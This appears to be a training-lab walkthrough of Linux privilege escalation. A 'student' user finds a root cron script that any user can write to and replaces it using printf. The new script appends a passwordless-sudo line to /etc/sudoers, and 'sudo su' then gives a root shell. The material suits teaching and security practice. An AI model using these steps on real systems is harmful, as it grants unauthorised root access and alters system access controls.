Cron jobs are tasks that are scheduled to run automatically at specific times or intervals.
First, locate the file that you suspect is being utilized by a cron job
Then, we will find what is using that file
-find / -name <file>
In this case, we found the same file (called message) in the /tmp/ directory.
This means there is some script/binary which is copying this file from student home
directory to /tmp directory. Search for that script. If this script is doing simple copy operation, it
must have source destination of the file in it. Try to locate that by using grep command.

-grep -nri “/tmp/message” /usr (In this case, we have to go through multiple directories to find usr)

In this case, we found the copy.sh script
We will Check the permissions on this script file and its contents

-ls -l /usr/local/share/copy.sh
-cat /usr/local/share/copy.sh

As the script file is writable by current “student” user, it can be modified to execute our
commands. This script is executed by root cron job, so it can do privileged operation.

We will use printf to replace the original code with the following lines since this vm has no text editors
- printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
On execution, these lines will add a new entry to /etc/sudoers file which will allow the student
user to use sudo without providing any password.

Usually you have to wait around a minute for cron jobs to run, but afterwards you will be able to run commands as admin. Just run
- sudo su
